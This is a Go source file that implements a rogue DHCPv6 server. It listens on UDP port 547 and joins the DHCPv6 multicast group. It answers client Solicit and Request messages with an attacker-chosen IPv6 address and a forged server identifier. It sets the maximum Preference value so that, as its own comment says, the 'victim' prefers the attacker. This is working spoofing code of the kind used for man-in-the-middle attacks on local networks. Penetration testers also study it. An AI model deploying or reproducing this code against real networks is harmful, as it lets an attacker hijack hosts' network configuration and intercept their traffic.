package dhcp6

import (
	"fmt"
	"github.com/fatih/color"
	"github.com/insomniacslk/dhcp/dhcpv6"
	"github.com/insomniacslk/dhcp/iana"
	"golang.org/x/net/ipv6"
	"net"
	"time"
)

func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {

	// Joining multicast group ff02::1:2 All DHCP Servers and Agents

	// need to listen (opening socket) first on port 547 udp - listen on all IPv6 interfaces on port 547 (DHCPv6 server port).
	conn, err := net.ListenPacket("udp6", "[::]:547")

	if err != nil {
		return fmt.Errorf("Failed to open connection on UDP port 547: %v", err)
	}

	defer conn.Close()

	// Joining the multicast group ff02::1:2
	p := ipv6.NewPacketConn(conn)

	iface, err := net.InterfaceByName(ifaceName) // -> get interface by name -> return the type i need (*net.Interface)

	if err != nil {
		return fmt.Errorf("failed to get interface %s: %v", ifaceName, err)
	}

	if err := p.JoinGroup(iface, &net.UDPAddr{IP: net.ParseIP("ff02::1:2")}); err != nil {
		return fmt.Errorf("failed to join multicast group: %v", err)
	}

	// create buffer
	buf := make([]byte, 65535)

	// receive new UDP packet (n -> It returns the number of bytes copied into) -- addr
	for {
		n, addr, err := conn.ReadFrom(buf)

		if err != nil {
			continue
		}

		// need to parse buffer
		dhcp, err := dhcpv6.MessageFromBytes(buf[:n])

		if err != nil {
			continue
		}

		// Switch case base on the message type
		switch dhcp.MessageType {

		case dhcpv6.MessageTypeSolicit:
			// Sending Advertise
			color.Yellow("%-10s  %-16s\n", time.Now().Format("15:04:05"), "DHCPv6 Solicit")
			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeAdvertise, offeredIP, macAddr)
			color.Cyan("%-10s  %-16s\n", time.Now().Format("15:04:05"), "DHCPv6 Advertise")

		case dhcpv6.MessageTypeRequest:
			//send Reply
			color.Yellow("%-10s  %-16s\n", time.Now().Format("15:04:05"), "DHCPv6 Request")
			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeReply, offeredIP, macAddr)
			color.Green("%-10s  %-16s\n", time.Now().Format("15:04:05"), "DHCPv6 Reply")
		}
	}

	return nil

}

// Sending response (Advertise / Reply)
func sendDHCPv6Response(conn net.PacketConn, addr net.Addr, dhcp *dhcpv6.Message, msgType dhcpv6.MessageType, offeredIP net.IP, macAddr string) {

	// options: (Client Identifier - DUID, server-identifer - DUID, Identity Association for Non-temporary Address (IA_NA))

	// Get the client ID
	clientIDOpt := dhcp.GetOneOption(dhcpv6.OptionClientID)

	if clientIDOpt == nil {
		return
	}

	// IAID must be unique among the identifiers for all of this client's IA_NAs (Need to be extracted)
	ianaOpt := dhcp.GetOneOption(dhcpv6.OptionIANA)

	if ianaOpt == nil {
		return
	}

	optIANA, ok := ianaOpt.(*dhcpv6.OptIANA)

	if !ok {
		return
	}

	mac, _ := net.ParseMAC(macAddr)
	serverDUID := &dhcpv6.DUIDLLT{
		HWType:        iana.HWTypeEthernet,
		LinkLayerAddr: mac,
		Time:          1,
	}

	// building the response
	resp := dhcpv6.Message{
		MessageType:   msgType,
		TransactionID: dhcp.TransactionID,
	}

	// Adding the options to the response //

	// Client-Identifier
	resp.AddOption(clientIDOpt)

	// server-Identifer
	resp.AddOption(dhcpv6.OptServerID(serverDUID))

	// IA_NA
	resp.AddOption(&dhcpv6.OptIANA{
		IaId: optIANA.IaId,
		T1:   3600 * time.Second,
		T2:   7200 * time.Second,
		Options: dhcpv6.IdentityOptions{
			Options: dhcpv6.Options{
				&dhcpv6.OptIAAddress{
					IPv6Addr:          offeredIP,
					PreferredLifetime: 3600 * time.Second,
					ValidLifetime:     7200 * time.Second,
				},
			},
		},
	})

	// Preference option -> Most important (tell the victim to prefer the attacker)
	resp.AddOption(&dhcpv6.OptionGeneric{
		OptionCode: dhcpv6.OptionPreference,
		OptionData: []byte{255},
	})

	// serialize and send
	bytes := resp.ToBytes()

	conn.WriteTo(bytes, addr)

}
